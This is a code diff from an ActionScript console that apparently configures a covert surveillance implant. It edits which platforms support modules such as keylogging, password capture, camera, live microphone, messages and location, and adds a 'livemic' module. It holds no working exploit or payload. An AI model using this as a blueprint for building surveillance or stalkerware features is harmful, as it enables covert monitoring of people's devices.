@@ -41,7 +41,7 @@ package it.ht.rcs.console
         {
           module: "calendar",
           _type: "desktop,mobile",
-          _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
+          _platform: "osx,ios,blackberry,winmo,symbian,android"
         },
         
         {
@@ -57,25 +57,25 @@ package it.ht.rcs.console
           module: "camera",
           quality: "med",
           _type: "desktop,mobile",
-          _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
+          _platform: "windows,osx,ios,winmo,symbian"
         },
         
         {
           module: "chat",
           _type: "desktop,mobile",
-          _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
+          _platform: "windows,osx,blackberry"
         },
         
         {
           module: "clipboard",
           _type: "desktop,mobile",
-          _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
+          _platform: "windows,osx,ios,blackberry,winmo,android"
         },
         
         {
           module: "conference",
           _type: "mobile",
-          _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
+          _platform: "winmo"
         },
         
         {
@@ -83,7 +83,7 @@ package it.ht.rcs.console
           network: {enabled: false, processes: []},
           hook: {enabled: true, processes: []},
           _type: "desktop,mobile",
-          _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
+          _platform: "windows,osx,ios,blackberry,winmo,android"
         },
         
         {
@@ -101,8 +101,8 @@ package it.ht.rcs.console
           date: '2010-01-01 00:00:00',
           accept: [],
           deny: [],
-          _type: "desktop,mobile",
-          _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
+          _type: "desktop",
+          _platform: "windows,osx"
         },
         
         {
@@ -112,21 +112,28 @@ package it.ht.rcs.console
           vm: 0,
           mobile: false,
           agent: '',
-          _type: "desktop,mobile",
-          _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
+          _type: "desktop",
+          _platform: "windows"
         },
         
         {
           module: "keylog",
           _type: "desktop,mobile",
-          _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
+          _platform: "windows,osx,ios"
+        },
+        
+        {
+          module: "livemic",
+          number: '',
+          _type: "mobile",
+          _platform: "winmo"
         },
         
         {
           module: "messages",
-          mail: {filter: {maxsize: 100000, datefrom: "2010-01-21 00:00:00", dateto: ''}},
+          mail: {filter: {maxsize: 100000, datefrom: "2010-01-21 00:00:00"}},
           _type: "desktop,mobile",
-          _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
+          _platform: "windows,ios,blackberry,winmo,symbian,android"
         },
         
         {
@@ -142,16 +149,16 @@ package it.ht.rcs.console
         
         {
           module: "mouse",
-          width: 40,
-          height: 40,
+          width: 50,
+          height: 50,
           _type: "desktop",
-          _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
+          _platform: "windows,osx"
         },
         
         {
           module: "password",
-          _type: "desktop,mobile",
-          _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
+          _type: "desktop",
+          _platform: "windows"
         },
         
         {
@@ -160,14 +167,14 @@ package it.ht.rcs.console
           cell: false,
           wifi: true,
           _type: "desktop,mobile",
-          _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
+          _platform: "windows,osx,blackberry,winmo,symbian,android"
         },
         
         {
           module: "print",
           quality: "med",
-          _type: "desktop,mobile",
-          _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
+          _type: "desktop",
+          _platform: "windows"
         },
         
         {
@@ -187,7 +194,7 @@ package it.ht.rcs.console
         {
           module: "url",
           _type: "desktop,mobile",
-          _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
+          _platform: "windows,osx,ios,blackberry,winmo"
         }
       ];
       
@@ -207,7 +214,7 @@ package it.ht.rcs.console
     
     private static function moduleFilterFunction(item:Object):Boolean
     {
-      return item._type.indexOf(agent.type) != -1;
+      return item._type.indexOf(agent.type) !=  -1;
     }
     
     private static function getGlobals():Object
